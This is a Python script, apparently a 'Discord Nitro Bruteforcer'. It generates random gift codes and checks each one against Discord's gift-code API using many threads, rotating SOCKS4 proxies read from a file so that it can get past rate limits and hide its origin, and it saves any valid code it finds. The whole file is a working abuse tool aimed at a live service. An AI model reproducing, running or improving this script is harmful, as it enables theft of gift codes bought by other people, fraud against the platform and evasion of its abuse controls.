import sys
import random, string
import time	
import requests	
import os
from random import randint
from threading import Thread, active_count

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def Checker():
  nitro = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
  if nitro in allcodes:
    print(bcolors.FAIL + "Doubled Code!" + bcolors.ENDC)
    return
  allcodes.append(nitro)
  lul = random.choice(list1)
  proxies = {}
  proxies = {
    'http':f'socks4://{lul}','https':f'socks4://{lul}'
  }

  url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
  try:
    r = requests.get(url, proxies=proxies)
  except:
    return

  if r.status_code == 429:
    print("\033[93mRate Limit!\033[0m")
  elif r.status_code == 200:
    msg = r.json()
    print(bcolors.FAIL + msg['message'] + bcolors.ENDC)
    print(" VALID |", nitro)
    f = open("YOU GOT ONE!", "a")
    f.write(nitro)
    f.close()
    exit()
  elif r.status_code == 404:
    print("\033[91m INVALID |",nitro + '\033[0m')
  else:
    print("\033[91m INVALID |",nitro + '\033[0m')
  return

if "win" in sys.platform:
    os.system("cls")
elif "linux" in sys.platform or "darwin" in sys.platform:
    os.system("clear")
	
print("""	
███╗░░██╗██╗████████╗██████╗░░█████╗░	
████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗	
██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║	
██║╚████║██║░░░██║░░░██╔══██╗██║░░██║	
██║░╚███║██║░░░██║░░░██║░░██║╚█████╔╝	
╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░	
██████╗░██████╗░██╗░░░██╗████████╗███████╗███████╗░█████╗░██████╗░██╗░░░██╗░█████╗░███████╗██████╗░  ██╗░░░██╗██████╗░	
██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔══██╗██║░░░██║██╔══██╗██╔════╝██╔══██╗  ██║░░░██║╚════██╗	
██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░█████╗░░██║░░██║██████╔╝╚██╗░██╔╝██║░░╚═╝█████╗░░██████╔╝  ╚██╗░██╔╝░░███╔═╝	
██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔══╝░░██║░░██║██╔══██╗░╚████╔╝░██║░░██╗██╔══╝░░██╔══██╗  ░╚████╔╝░██╔══╝░░	
██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗██║░░░░░╚█████╔╝██║░░██║░░╚██╔╝░░╚█████╔╝███████╗██║░░██║  ░░╚██╔╝░░███████╗	
╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚══════╝╚═╝░░╚═╝  ░░░╚═╝░░░╚══════╝	
""")	
print("Made by Jonas Grubbauer")	
print("-------------------------")	
print("Starting...")

try:
  f = open("proxies.txt", "r")
except:
  print("Creating proxies.txt...")
  fi = open("proxies.txt", "w")
  fi.close()
  input("File created! Please only use Socks4 Proxies! Hit enter to exit...")
  exit()
list1 = []
allcodes = []
for x in f:
  lol = x.removesuffix('\n')
  lol1 = lol.removesuffix(' ')
  list1.append(lol1)
f.close()


try:
  threadnum = int(input("How many Threads?: "))
except:
  print("Please only enter a positive Number!")
def Start():
  count = 0
  while True:
    if active_count() < threadnum:
      Thread(target=Checker).start()
      count += 1

      title = f"-- DISCORD NITRO BRUTEFORCER -- Threads started: {count} Currently Active Threads: {active_count()}"
      if "win" in sys.platform:
          os.system("title " + title)
      elif "linux" in sys.platform or "darwin" in sys.platform:
          os.system("echo -ne '\033]0;" + title + "\007'")
Start()

